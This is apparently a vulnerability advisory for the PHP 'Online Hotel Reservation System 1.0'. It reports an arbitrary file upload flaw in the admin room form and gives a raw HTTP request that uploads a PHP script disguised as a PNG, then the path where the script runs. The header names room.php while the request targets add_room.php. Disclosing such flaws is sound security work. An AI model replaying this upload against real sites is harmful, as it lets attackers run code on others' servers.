## Online Hotel Reservation System has an File upload vulnerability

## Affected version:

Online Hotel Reservation System - 1.0

## Software:

https://code-projects.org/simple-online-hotel-reservation-system-in-php-with-source-code/

## Vulnerability File:

HOR/admin/room.php

## Description:

The administrator login interface of this online hotel system has an arbitrary file upload vulnerability. Attackers can upload malicious script files by modifying file contents and file names.

Status: Moderate

POC

```
POST /HOR/admin/add_room.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary8e25443fbbc19237fe585950ca860915
Content-Length: 568
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/HOR/admin/add_room.php
Cookie: PHPSESSID=db5no8dvip725j5p64esp3qbge
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundary8e25443fbbc19237fe585950ca860915
Content-Disposition: form-data; name="room_type"

Jr. Suite
------geckoformboundary8e25443fbbc19237fe585950ca860915
Content-Disposition: form-data; name="price"

12
------geckoformboundary8e25443fbbc19237fe585950ca860915
Content-Disposition: form-data; name="photo"; filename="web.php"
Content-Type: image/png

<?php phpinfo();?>
------geckoformboundary8e25443fbbc19237fe585950ca860915
Content-Disposition: form-data; name="add_room"


------geckoformboundary8e25443fbbc19237fe585950ca860915--

```

After a successful upload, access the following path:

```
/HOR/photo/web.php
```

image:

![image](https://github.com/foreverfeifei/HOR-CVE/blob/main/Pasted%20image%2020251021141943.png)


